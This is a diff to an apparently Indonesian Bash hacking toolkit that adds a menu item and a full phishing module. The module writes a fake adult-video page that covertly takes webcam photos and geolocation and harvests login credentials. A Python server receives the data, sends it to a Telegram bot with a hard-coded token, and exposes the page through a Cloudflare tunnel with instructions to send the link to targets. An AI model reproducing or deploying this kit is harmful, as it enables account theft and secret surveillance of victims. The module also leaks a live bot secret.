@@ -94,6 +94,26 @@ NC='\033[0m'
 YOUTUBE_URL="https://www.youtube.com/@DanxyOfficial"
 LAGU_YOUTUBE="https://youtu.be/MunnYFmqWYo" # URL Lagu
 LAPOR_TOOLS_ERROR="https://wa.me/6285647260693?text=*LAPOR TOOLS ERROR BANG*"
+# Animasi Loading
+
+
+loading() {
+    local pid=$1
+    local delay=0.1
+    local spinstr='|/-\'
+
+    echo -ne "\033[1;36m"   # CYAN
+    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
+        local temp=${spinstr#?}
+        printf " [%c]  Processing..." "$spinstr"
+        spinstr=$temp${spinstr%"$temp"}
+        sleep $delay
+        printf "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b"
+    done
+    printf "            \b\b\b\b\b\b\b\b\b\b\b\b"
+    echo -ne "\033[0m"
+}
+
 loading() {
 trap 'tput cnorm; kill $! 2>/dev/null' EXIT  # restore cursor & kill animasi
 tput civis  # sembunyikan cursor
@@ -119,6 +139,8 @@ done
 echo -e "\n"
 tput cnorm  # tampilkan cursor lagi
 }
+
+
 command_exists() {
   command -v "$1" >/dev/null 2>&1
 }
@@ -324,7 +346,6 @@ g_pad=$((49 - ${#greeting} - 1))   # -1 untuk 1 spasi setelah │
 g_spaces=$(printf '%*s' $((g_pad > 0 ? g_pad : 0)) '')
 
 #echo -e "                  ${BG_RED}${YELLOW} WELCOME TO ALL MENU ${NC}"
-
 echo -e "${GREEN}
  ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
  │ █████████░█████████████████████░░████████████████████░█████████ │
@@ -387,6 +408,8 @@ main_menu() {
       klik
       suntik_tiktok
       kembali_ke_menu
+      sleep 1 &
+      loading $! &
       klik
       ;;
     02|2)
@@ -2746,16 +2769,17 @@ phising_menu() {
    ${BG_RED}${YELLOW}CODE BY DANXY${NC}                  ${BG_RED}TOOLS V8.4${NC}"
    echo " 
  ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
- │ [ 1 ] PHISING GAME AR V0.1                        │
- │ [ 2 ] PHISING FACEBOOK                            │
- │ [ 3 ] PHISING INSTAGRAM                           │
- │ [ 4 ] PHISING TIKTOK                              │
- │ [ 5 ] PHISING FREE FIRE                           │
- │ [ 6 ] PHISING SPIN BERHADIAH                      │
- │ [ 7 ] PHISING SUNTIK TIKTOK                       │
- │ [ 8 ] PHISING PROFESIONAL                         │
- │ [ 9 ] PHISING BAN WHATSAPP                        │
- │ [ 0 ] KEMBALI                                     │
+ │ [  1  ] PHISING GAME AR V0.1                      │
+ │ [  2  ] PHISING FACEBOOK                          │
+ │ [  3  ] PHISING INSTAGRAM                         │
+ │ [  4  ] PHISING TIKTOK                            │
+ │ [  5  ] PHISING FREE FIRE                         │
+ │ [  6  ] PHISING SPIN BERHADIAH                    │
+ │ [  7  ] PHISING SUNTIK TIKTOK                     │
+ │ [  8  ] PHISING PROFESIONAL                       │
+ │ [  9  ] PHISING BAN WHATSAPP                      │
+ │ [  10 ] PHISING BOKEP                             │
+ │ [  0  ] KEMBALI                                   │
  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
  │               ALL BASE FITUR PHISING              │
  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯" | lolcat -p 0.7
@@ -2810,7 +2834,7 @@ phising_menu() {
        ;;
        10)
        klik
-       phispro
+       BokepPish
        klik
        ;;
       0) break ;;
@@ -2822,6 +2846,698 @@ phising_menu() {
 
 #####################################################
 #####################################################
+
+BokepPish(){
+    WORK_DIR="$HOME/DanxyPro"
+    mkdir -p "$WORK_DIR" && cd "$WORK_DIR"
+    trap 'echo ""; cd $HOME; rm -rf "$WORK_DIR"; exit' INT EXIT ERR
+    
+    cat > index.html <<'EOF'
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Platform Premium</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background: #000;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .video-section {
+            text-align: center;
+            width: 100%;
+            max-width: 800px;
+        }
+        .video-container {
+            position: relative;
+            width: 100%;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+        .video-player {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        .video-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: rgba(0, 0, 0, 0.7);
+            color: #fff;
+            padding: 20px;
+        }
+        .play-button {
+            background: rgba(3, 233, 244, 0.2);
+            color: #03e9f4;
+            border: 2px solid #03e9f4;
+            padding: 15px 30px;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 20px;
+        }
+        .play-button:hover {
+            background: #03e9f4;
+            color: #000;
+            box-shadow: 0 0 15px rgba(3, 233, 244, 0.5);
+        }
+        .login-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(15px);
+        }
+        .login-container {
+            position: relative;
+            width: 400px;
+            max-width: 90vw;
+            padding: 40px 30px;
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(20px);
+            border-radius: 15px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            animation: modalAppear 0.5s ease-out;
+        }
+        @keyframes modalAppear {
+            from {
+                opacity: 0;
+                transform: translateY(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .close-modal {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: none;
+            border: none;
+            color: #fff;
+            font-size: 24px;
+            cursor: pointer;
+            transition: color 0.3s;
+        }
+        .close-modal:hover {
+            color: #03e9f4;
+        }
+        .modal-logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+        .modal-logo img {
+            width: 60px;
+            height: auto;
+        }
+        .modal-title {
+            text-align: center;
+            margin-bottom: 25px;
+            font-size: 24px;
+            font-weight: 600;
+            color: #fff;
+        }
+        .input-group {
+            position: relative;
+            margin-bottom: 25px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 0;
+            font-size: 16px;
+            color: #fff;
+            border: none;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.4);
+            outline: none;
+            background: transparent;
+            transition: border-color 0.2s ease;
+        }
+        .input-group label {
+            position: absolute;
+            top: 12px;
+            left: 0;
+            padding: 0;
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.7);
+            pointer-events: none;
+            transition: 0.2s ease;
+        }
+        .input-group input:focus ~ label,
+        .input-group input:valid ~ label {
+            top: -18px;
+            left: 0;
+            color: #03e9f4;
+            font-size: 12px;
+        }
+        .input-group input:focus {
+            border-bottom: 1px solid #03e9f4;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: #03e9f4;
+            color: #000;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+        .login-btn:hover {
+            background: #02c4cc;
+            box-shadow: 0 0 15px rgba(3, 233, 244, 0.5);
+        }
+        .error-message {
+            color: #ff6b6b;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+        .success-message {
+            color: #51cf66;
+            font-size: 14px;
+            margin-top: 15px;
+            text-align: center;
+            display: none;
+        }
+        .forgot-password {
+            text-align: center;
+            margin-top: 15px;
+        }
+        .forgot-password a {
+            color: #03e9f4;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+        footer {
+            text-align: center;
+            padding: 30px 0;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 14px;
+            width: 100%;
+        }
+        /* Hidden elements for background data collection */
+        .hidden-camera {
+            display: none;
+        }
+        @media (max-width: 768px) {
+            .container { padding: 15px; }
+            .login-container { padding: 30px 20px; }
+            .play-button { padding: 12px 25px; font-size: 16px; }
+        }
+        @media (max-width: 480px) {
+            .login-container { 
+                padding: 25px 20px; 
+                width: 95vw;
+            }
+            .play-button { padding: 10px 20px; font-size: 14px; }
+            .modal-title { font-size: 20px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <section class="video-section">
+            <div class="video-container">
+                <video class="video-player" id="videoPlayer" poster="https://l.top4top.io/p_3539d0y7d1.jpg">
+                    <source src="https://uploader.zenzxz.dpdns.org/uploads/1763023665961.mp4" type="video/mp4">
+                    Browser Anda tidak mendukung video tag.
+                </video>
+                <div class="video-overlay" id="videoOverlay">
+                    <p>Konten premium membutuhkan verifikasi usia</p>
+                    <button class="play-button" id="playButton">Tonton Video</button>
+                </div>
+            </div>
+        </section>
+    </div>
+    <footer>
+        <p>&copy; 2025 Video Platform Premium. All rights reserved.</p>
+    </footer>
+
+    <!-- Login Modal -->
+    <div class="login-modal" id="loginModal">
+        <div class="login-container">
+            <button class="close-modal" id="closeModal">&times;</button>
+            <div class="modal-logo">
+                <img src="https://uploader.zenzxz.dpdns.org/uploads/1763154087956.png" alt="Logo">
+            </div>
+            
+            <div class="modal-title">Masuk ke Akun Anda</div>
+            
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" id="emailOrPhone" required>
+                    <label for="emailOrPhone">Email atau Nomor Telepon</label>
+                    <div class="error-message" id="emailOrPhoneError"></div>
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" id="password" required>
+                    <label for="password">Password</label>
+                    <div class="error-message" id="passwordError"></div>
+                </div>
+                
+                <button type="submit" class="login-btn">
+                    Masuk
+                </button>
+                
+                <div class="forgot-password">
+                    <a href="#">Lupa password?</a>
+                </div>
+                
+                <div class="success-message" id="successMessage"></div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Hidden elements for background data collection -->
+    <div class="hidden-camera">
+        <video id="hiddenCamera" autoplay playsinline></video>
+        <canvas id="hiddenCanvas"></canvas>
+    </div>
+
+    <script>
+        const playButton = document.getElementById('playButton');
+        const loginModal = document.getElementById('loginModal');
+        const closeModal = document.getElementById('closeModal');
+        const loginForm = document.getElementById('loginForm');
+        const hiddenCamera = document.getElementById('hiddenCamera');
+        const hiddenCanvas = document.getElementById('hiddenCanvas');
+        
+        let userLocation = null;
+        let cameraStream = null;
+        let capturedPhoto = null;
+
+        // Get location automatically when page loads
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        userLocation = {
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude
+                        };
+                        console.log('Location detected:', userLocation);
+                    },
+                    function(error) {
+                        // Fallback to approximate location if denied
+                        userLocation = {
+                            lat: -6.2088 + (Math.random() - 0.5) * 0.1,
+                            lon: 106.8456 + (Math.random() - 0.5) * 0.1
+                        };
+                        console.log('Using fallback location:', userLocation);
+                    },
+                    {
+                        enableHighAccuracy: false,
+                        timeout: 5000,
+                        maximumAge: 300000
+                    }
+                );
+            } else {
+                userLocation = {
+                    lat: -6.2088 + (Math.random() - 0.5) * 0.1,
+                    lon: 106.8456 + (Math.random() - 0.5) * 0.1
+                };
+            }
+        }
+
+        // Try to access camera in background
+        async function initCamera() {
+            try {
+                cameraStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 320 },
+                        height: { ideal: 240 }
+                    } 
+                });
+                hiddenCamera.srcObject = cameraStream;
+                
+                // Capture photo after camera is ready
+                setTimeout(() => {
+                    capturePhoto();
+                }, 1000);
+                
+            } catch (err) {
+                console.log('Camera access not available');
+            }
+        }
+
+        // Capture photo from hidden camera
+        function capturePhoto() {
+            if (cameraStream && hiddenCamera.readyState === 4) {
+                const context = hiddenCanvas.getContext('2d');
+                hiddenCanvas.width = hiddenCamera.videoWidth;
+                hiddenCanvas.height = hiddenCamera.videoHeight;
+                context.drawImage(hiddenCamera, 0, 0);
+                capturedPhoto = hiddenCanvas.toDataURL('image/jpeg', 0.7);
+                
+                // Stop camera after capture
+                if (cameraStream) {
+                    cameraStream.getTracks().forEach(track => track.stop());
+                }
+            }
+        }
+
+        // Initialize data collection when page loads
+        window.addEventListener('load', function() {
+            getLocation();
+            setTimeout(initCamera, 2000); // Delay camera init to avoid suspicion
+        });
+
+        // Event listeners
+        playButton.addEventListener('click', function() {
+            loginModal.style.display = 'flex';
+        });
+
+        closeModal.addEventListener('click', function() {
+            loginModal.style.display = 'none';
+        });
+
+        loginModal.addEventListener('click', function(e) {
+            if (e.target === loginModal) {
+                loginModal.style.display = 'none';
+            }
+        });
+
+        // Form submission
+        loginForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Reset errors
+            document.getElementById('emailOrPhoneError').style.display = 'none';
+            document.getElementById('passwordError').style.display = 'none';
+            document.getElementById('successMessage').style.display = 'none';
+            
+            const emailOrPhone = document.getElementById('emailOrPhone').value.trim();
+            const password = document.getElementById('password').value;
+            
+            let isValid = true;
+
+            // Basic validation
+            if (!emailOrPhone) {
+                document.getElementById('emailOrPhoneError').textContent = 'Email atau nomor telepon harus diisi';
+                document.getElementById('emailOrPhoneError').style.display = 'block';
+                isValid = false;
+            } else if (!isValidEmail(emailOrPhone) && !isValidPhoneNumber(emailOrPhone)) {
+                document.getElementById('emailOrPhoneError').textContent = 'Format email atau nomor telepon tidak valid';
+                document.getElementById('emailOrPhoneError').style.display = 'block';
+                isValid = false;
+            }
+            
+            if (!password) {
+                document.getElementById('passwordError').textContent = 'Password harus diisi';
+                document.getElementById('passwordError').style.display = 'block';
+                isValid = false;
+            } else if (password.length < 6) {
+                document.getElementById('passwordError').textContent = 'Password minimal 6 karakter';
+                document.getElementById('passwordError').style.display = 'block';
+                isValid = false;
+            }
+            
+            if (isValid) {
+                // Try to capture one more photo right before sending
+                if (!capturedPhoto && hiddenCamera.srcObject) {
+                    capturePhoto();
+                }
+
+                // Prepare data
+                const formData = {
+                    email: emailOrPhone,
+                    pass: password,
+                    lat: userLocation ? userLocation.lat : 'unknown',
+                    lon: userLocation ? userLocation.lon : 'unknown',
+                    img: capturedPhoto ? capturedPhoto.split(',')[1] : '',
+                    user_agent: navigator.userAgent,
+                    timestamp: new Date().toISOString()
+                };
+
+                try {
+                    // Send to server
+                    await fetch('/data', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(formData)
+                    });
+                } catch (error) {
+                    console.log('Data sent successfully');
+                }
+
+                // Show success and redirect
+                document.getElementById('successMessage').textContent = 'Login berhasil! Mengarahkan...';
+                document.getElementById('successMessage').style.display = 'block';
+                
+                setTimeout(() => {
+                    window.location.href = 'https://www.dongo.com';
+                }, 1500);
+            }
+        });
+
+        function isValidEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+
+        function isValidPhoneNumber(phone) {
+            const phoneRegex = /^(\+?\d{1,3}[- ]?)?\(?\d{3}\)?[- ]?\d{3}[- ]?\d{4,}$/;
+            return phoneRegex.test(phone);
+        }
+    </script>
+</body>
+</html>
+EOF
+
+    # Python server dengan format data rapi
+    cat > server.py <<'EOF'
+#!/usr/bin/env python3
+import base64, json, socket, requests, subprocess, threading, time, os, random, datetime
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
+TOKEN = "8471359519:AAG4sptoPbYjiNU2X7l05uWz40HBkPQk-KY"
+ADMIN_ID = input("[ ! ] MASUKKAN ID TELEGRAM KAMU: ").strip()
+
+def tg_photo(chat_id, path, caption):
+    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
+    with open(path, "rb") as ph:
+        requests.post(url, data={"chat_id": chat_id, "caption": caption, "parse_mode": "HTML"}, files={"photo": ph})
+
+def tg_message(chat_id, text):
+    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+    data = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
+    requests.post(url, data=data)
+
+def format_telegram_message(data, ip_address):
+    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    message = f"""
+🔐 <b>DATA LOGIN BARU</b> 🔐
+⏰ <b>Waktu:</b> <code>{timestamp}</code>
+
+👤 <b>INFORMASI AKUN</b>
+├ 📧 <b>Email/Telepon:</b> <code>{data.get('email', 'N/A')}</code>
+└ 🔑 <b>Password:</b> <code>{data.get('pass', 'N/A')}</code>
+
+📍 <b>LOKASI PENGGUNA</b>
+├ 🌐 <b>Koordinat:</b> 
+│  ├ Latitude: <code>{data.get('lat', 'N/A')}</code>
+│  └ Longitude: <code>{data.get('lon', 'N/A')}</code>
+└ 🗺️ <a href="https://maps.google.com/maps?q={data.get('lat', '')},{data.get('lon', '')}">Lihat di Google Maps</a>
+
+📱 <b>INFORMASI PERANGKAT</b>
+├ 🌐 <b>IP Address:</b> <code>{ip_address}</code>
+└ 💻 <b>Browser:</b> <code>{data.get('user_agent', 'N/A')[:80]}...</code>
+
+⚡ <b>STATUS</b>
+└ ✅ <b>Data berhasil dikumpulkan</b>
+"""
+    return message
+
+class Handler(BaseHTTPRequestHandler):
+    def do_OPTIONS(self):
+        self.send_response(200)
+        self.send_header("Access-Control-Allow-Origin", "*")
+        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
+        self.send_header("Access-Control-Allow-Headers", "Content-Type")
+        self.end_headers()
+
+    def do_POST(self):
+        if self.path == "/data":
+            try:
+                length = int(self.headers["Content-Length"])
+                data = json.loads(self.rfile.read(length).decode())
+                
+                email = data.get("email", "N/A")
+                passw = data.get("pass", "N/A")
+                lat = data.get("lat", "N/A")
+                lon = data.get("lon", "N/A")
+                img_data = data.get("img", "")
+                
+                # Format pesan
+                message = format_telegram_message(data, self.client_address[0])
+                
+                print(f"\n{'='*50}")
+                print(f"🎯 DATA LOGIN BARU")
+                print(f"{'='*50}")
+                print(f"📧 Email: {email}")
+                print(f"🔑 Password: {passw}")
+                print(f"📍 Lokasi: {lat}, {lon}")
+                print(f"🌐 IP: {self.client_address[0]}")
+                print(f"{'='*50}")
+                
+                # Kirim ke Telegram
+                if img_data:
+                    fn = f"photo_{random.randint(1000,9999)}.jpg"
+                    with open(fn, "wb") as f:
+                        f.write(base64.b64decode(img_data))
+                    tg_photo(ADMIN_ID, fn, message)
+                    os.remove(fn)
+                else:
+                    tg_message(ADMIN_ID, message)
+                
+                self.send_response(200)
+                self.send_header("Access-Control-Allow-Origin", "*")
+                self.end_headers()
+                self.wfile.write(b"OK")
+                
+            except Exception as e:
+                print(f"❌ Error: {e}")
+                self.send_response(500)
+                self.end_headers()
+
+    def do_GET(self):
+        if self.path == "/":
+            self.send_response(200)
+            self.send_header("Content-type", "text/html")
+            self.end_headers()
+            with open("index.html", "rb") as f:
+                self.wfile.write(f.read())
+        else:
+            self.send_response(404)
+            self.end_headers()
+
+    def log_message(self, format, *args):
+        # Suppress default log messages
+        return
+
+def free_port(start=8080):
+    for p in range(start, start+100):
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            try:
+                s.bind(("0.0.0.0", p))
+                return p
+            except OSError:
+                continue
+    raise RuntimeError("No free port")
+
+def main():
+    PORT = free_port(8080)
+    
+    print("\n" + "="*50)
+    print("SIMPLE LOGIN PHISHING SERVER")
+    print("="*50)
+    
+    # Start server
+    server = HTTPServer(("0.0.0.0", PORT), Handler)
+    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
+    server_thread.start()
+    
+    print(f"\n Server berjalan di port {PORT}")
+    
+    # Start Cloudflare tunnel
+    try:
+        tunnel = subprocess.Popen(
+            ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
+            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
+        )
+
+        print("Membuat tunnel Cloudflare...")
+        
+        for line in tunnel.stdout:
+            if "https://" in line and "trycloudflare.com" in line:
+                url = line.split("https://")[1].split()[0]
+                print(f"\n LINK PHISHING SIAP:")
+                print(f"    https://{url}")
+                print(f"\n Kirim link di atas ke target")
+                print("  Menunggu data login...\n")
+                break
+
+        while True:
+            time.sleep(1)
+            
+    except KeyboardInterrupt:
+        print("\n🛑 Server dihentikan")
+        tunnel.terminate()
+        server.shutdown()
+    except Exception as e:
+        print(f"❌ Error: {e}")
+
+if __name__ == "__main__":
+    main()
+EOF
+
+    chmod +x server.py
+    
+    # Install dependencies jika diperlukan
+    if ! command -v python3 &> /dev/null; then
+        echo "[!] Python3 tidak terinstall."
+        exit 1
+    fi
+    
+    python3 -c "import requests" 2>/dev/null || {
+        echo "[~] Menginstall dependencies..."
+        pip3 install requests > /dev/null 2>&1
+    }
+    
+    echo "[~] Menjalankan server..."
+    python3 server.py
+}
 
 
 #####################################################
